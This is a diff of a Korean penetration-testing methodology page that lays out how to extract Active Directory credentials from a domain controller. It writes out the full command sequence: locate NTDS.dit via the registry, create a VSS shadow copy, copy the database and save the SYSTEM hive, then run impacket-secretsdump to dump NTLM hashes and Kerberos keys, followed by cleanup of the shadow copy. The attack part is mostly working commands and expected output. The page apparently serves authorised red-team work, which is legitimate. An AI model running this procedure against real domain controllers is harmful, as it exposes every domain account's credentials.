@@ -98,16 +98,42 @@ impacket-secretsdump -use-vss -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<REQUESTER>@<
 
 #### DC에서 파일 확보 흐름
 
+기본 `C:\Windows\NTDS\NTDS.dit`를 가정하지 말고 먼저 실제 database 경로와 그 volume을 확인한다. 실행 전 해당 volume의 shadow 목록을 기록하고, 임시 복사 경로가 없음을 확인한다.
+
 ```cmd
-vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
-reg save HKLM\SYSTEM C:\Windows\Temp\system.save
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "DSA Database File"
+vssadmin list shadows /for=<NTDS_VOLUME>
+if exist "<NTDS_COPY_PATH>" echo NTDS_COPY_EXISTS
+if exist "<SYSTEM_HIVE_PATH>" echo SYSTEM_HIVE_EXISTS
+vssadmin create shadow /for=<NTDS_VOLUME>
+```
+
+생성 출력의 `Shadow Copy ID`를 `<NTDS_SHADOW_ID>`, `Shadow Copy Volume Name`을 `<NTDS_SHADOW_VOLUME>`으로 기록한다. registry에서 확인한 NTDS 경로의 drive prefix를 `<NTDS_SHADOW_VOLUME>`으로 바꾼 exact 경로를 `<NTDS_SHADOW_NTDS_PATH>`로 사용한다. `HarddiskVolumeShadowCopy1` 같은 번호를 고정하지 않는다.
+
+```cmd
+copy "<NTDS_SHADOW_NTDS_PATH>" "<NTDS_COPY_PATH>"
+reg save HKLM\SYSTEM "<SYSTEM_HIVE_PATH>"
+dir "<NTDS_COPY_PATH>" "<SYSTEM_HIVE_PATH>"
 ```
 
 확인할 출력:
 
 - `ntds.dit`, `system.save` 확보.
 - 두 파일은 함께 있어야 오프라인 복호화 입력이 된다. 이 시점은 hash 수집 전의 파일 확보 단계다.
+
+### 이미 확보한 NTDS.dit와 SYSTEM hive 오프라인 분석
+
+Hyper-V export, 승인된 backup 또는 다른 파일 접근 경로에서 같은 DC·시점의 `NTDS.dit`와 `SYSTEM` hive를 이미 확보했다면 새로운 VSS·원격 service 작업을 만들지 않고 Linux 분석 호스트에서 기존 파일만 처리한다.
+
+```bash
+impacket-secretsdump -ntds '<NTDS_FILE>' -system '<SYSTEM_HIVE>' LOCAL
+```
+
+확인할 출력:
+
+- `BootKey`, `Dumping Domain Credentials`와 계정별 NTLM hash·Kerberos key.
+- `ntds.dit`와 SYSTEM hive의 host·시점이 다르거나 파일이 불완전하면 boot key·PEK 복호화 오류가 날 수 있다. 파일 존재만으로 credential 추출 성공을 기록하지 않는다.
+- Hyper-V VHDX 자체, mounted volume과 export directory 정리는 [[Hyper-V VM 내보내기와 가상 디스크 오프라인 수집]]에서 수행하고, 이 명령의 별도 output file을 만들었다면 [[impacket-secretsdump]]의 산출물 기준으로 정리한다.
 
 ## 관찰과 상태 전환
 
@@ -129,9 +155,18 @@ reg save HKLM\SYSTEM C:\Windows\Temp\system.save
 
 ## 변경 영향과 복구
 
-| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
-|---|---|---|---|
-| DC의 VSS snapshot과 임시 `ntds.dit`·SYSTEM 복사본 | 디스크 공간 사용, 보안 제품 경고 및 DC의 민감한 복사본 잔류 | 생성한 shadow ID, 파일 경로·크기와 접근 ACL 확인 | 이번 절차에서 생성한 shadow copy와 임시 복사본을 제거하고, 제거 뒤 원본 NTDS 서비스와 디스크 여유 공간을 확인 |
+로컬 파일 확보 방식은 DC에 `<NTDS_SHADOW_ID>`와 `<NTDS_COPY_PATH>`·`<SYSTEM_HIVE_PATH>`를 만든다. 파일 회수와 무결성 확인을 마친 뒤 임시 파일을 먼저 제거하고, 이번 실행에서 기록한 shadow ID 하나만 삭제한다. `/oldest`나 `/all`은 기존 backup·restore point까지 지울 수 있으므로 사용하지 않는다.
+
+```cmd
+del /f "<NTDS_COPY_PATH>"
+del /f "<SYSTEM_HIVE_PATH>"
+if exist "<NTDS_COPY_PATH>" echo NTDS_COPY_REMAINS
+if exist "<SYSTEM_HIVE_PATH>" echo SYSTEM_HIVE_REMAINS
+vssadmin delete shadows /for=<NTDS_VOLUME> /shadow=<NTDS_SHADOW_ID>
+vssadmin list shadows /shadow=<NTDS_SHADOW_ID>
+```
+
+두 `if exist` 명령이 아무것도 출력하지 않고 마지막 조회에서 해당 ID가 더 이상 나타나지 않아야 로컬 생성 자원 정리가 확인된다. `Snapshots were found, but they were outside of your allowed context`가 나오면 `vssadmin`으로 삭제 가능한 유형이 아니다. 이때 다른 shadow를 지우지 말고 생성에 사용한 provider·context와 `diskshadow` 관리 가능 여부를 확인하며, exact ID의 부재를 확인하기 전에는 복구 완료로 기록하지 않는다. 이미 회수·표시된 hash·key와 Windows 감사 흔적은 snapshot·파일 삭제로 되돌릴 수 없다.
 
 - 원격 `secretsdump` 방식도 서비스 생성·원격 레지스트리 상태 변경 여부를 해당 도구 출력과 환경 정책에 따라 확인하고, 이번 실행에서 만든 임시 원격 리소스만 정리한다.
 
@@ -155,3 +190,12 @@ reg save HKLM\SYSTEM C:\Windows\Temp\system.save
 - [[powershell]]
 - [[hashcat]]
 - [[klist]]
+
+## 참고 링크
+
+- [Microsoft Defender for Endpoint: AD DS database path registry value](https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-exclusions-windows-server#active-directory-exclusions)
+- [Microsoft Learn: Volume Shadow Copy Service tools](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
+- [Microsoft Learn: vssadmin list shadows](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-list-shadows)
+- [Microsoft Learn: vssadmin delete shadows](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-delete-shadows)
+- [Microsoft Learn: reg save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)
+- [Fortra Impacket: secretsdump command](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
